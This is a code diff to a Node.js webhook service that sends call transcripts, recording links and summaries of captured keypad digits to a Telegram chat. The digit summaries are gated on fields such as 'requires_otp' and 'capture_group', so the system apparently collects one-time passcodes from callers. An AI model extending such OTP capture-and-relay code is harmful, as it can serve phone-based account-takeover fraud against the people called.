@@ -57,6 +57,49 @@ function buildSignalBars(strength, max = 5, empty = '░') {
     .join('');
 }
 
+function pickTranscriptAssetUrl(callDetails = {}, states = []) {
+  const pickHttp = (value) => {
+    const candidate = String(value || '').trim();
+    if (!candidate) return null;
+    if (!/^https?:\/\//i.test(candidate)) return null;
+    return candidate;
+  };
+  const callCandidates = [
+    callDetails.transcript_audio_url,
+    callDetails.transcriptAudioUrl,
+    callDetails.recording_url,
+    callDetails.recordingUrl,
+    callDetails.audio_url,
+    callDetails.audioUrl,
+  ];
+  for (const candidate of callCandidates) {
+    const url = pickHttp(candidate);
+    if (url) return url;
+  }
+  for (const state of states) {
+    const data =
+      state?.data && typeof state.data === 'object' && !Array.isArray(state.data)
+        ? state.data
+        : {};
+    const stateCandidates = [
+      data.transcript_audio_url,
+      data.transcriptAudioUrl,
+      data.recording_url,
+      data.recordingUrl,
+      data.audio_url,
+      data.audioUrl,
+      data.media_url,
+      data.mediaUrl,
+      data.url,
+    ];
+    for (const candidate of stateCandidates) {
+      const url = pickHttp(candidate);
+      if (url) return url;
+    }
+  }
+  return null;
+}
+
 class EnhancedWebhookService {
   constructor() {
     this.isRunning = false;
@@ -487,6 +530,30 @@ class EnhancedWebhookService {
     return parts.join('\n');
   }
 
+  shouldIncludeDigitSummary(events = [], callDetails = null) {
+    if (!Array.isArray(events) || events.length === 0) {
+      return false;
+    }
+    const details = callDetails || {};
+    const hasConfiguredDigitProfile = Boolean(
+      details?.requires_otp
+      || details?.collection_profile
+      || details?.default_profile
+      || details?.expected_length
+      || details?.capture_group
+    );
+    if (hasConfiguredDigitProfile) {
+      return true;
+    }
+    return events.some((event) => {
+      const profile = String(event?.profile || '').toLowerCase();
+      if (profile && profile !== 'generic') return true;
+      const digits = String(event?.digits || '').trim();
+      if (digits) return true;
+      return false;
+    });
+  }
+
   start(database) {
     this.db = database;
     
@@ -864,7 +931,9 @@ class EnhancedWebhookService {
             let digitSummary = '';
             if (this.db?.getCallDigits) {
               const events = await this.db.getCallDigits(call_sid).catch(() => []);
-              digitSummary = this.buildDigitSummaryFromEvents(events, { spoiler: true, escape: true });
+              if (this.shouldIncludeDigitSummary(events, callDetails)) {
+                digitSummary = this.buildDigitSummaryFromEvents(events, { spoiler: true, escape: true });
+              }
             }
             if (digitSummary) {
               const header = escapeMarkdownV2(message);
@@ -1004,8 +1073,18 @@ class EnhancedWebhookService {
     try {
       const callDetails = await this.db.getCall(call_sid);
       const transcripts = await this.db.getCallTranscripts(call_sid);
+      const hasTranscriptText = (transcripts || []).some(
+        (entry) => String(entry?.message || '').trim().length > 0,
+      );
+      let hasTranscriptAudio = Boolean(
+        pickTranscriptAssetUrl(callDetails || {}, []),
+      );
+      if (!hasTranscriptAudio) {
+        const callStates = await this.db.getCallStates(call_sid, { limit: 40 }).catch(() => []);
+        hasTranscriptAudio = Boolean(pickTranscriptAssetUrl(callDetails || {}, callStates));
+      }
       
-      if (!callDetails || !transcripts || transcripts.length === 0) {
+      if (!callDetails || (!hasTranscriptText && !hasTranscriptAudio)) {
         await this.sendTelegramMessage(telegram_chat_id, '📋 No transcript available for this call');
         return true;
       }
@@ -1106,7 +1185,7 @@ class EnhancedWebhookService {
       }
 
       message += `💬 *Messages:* ${transcripts.length}\n`;
-      if (digitEvents && digitEvents.length) {
+      if (this.shouldIncludeDigitSummary(digitEvents, callDetails)) {
         const digitSummary = this.buildDigitSummaryFromEvents(digitEvents);
         message += `🔢 *Man-detective:*\n${digitSummary}\n`;
         message += `\n*Digit Timeline:*\n`;
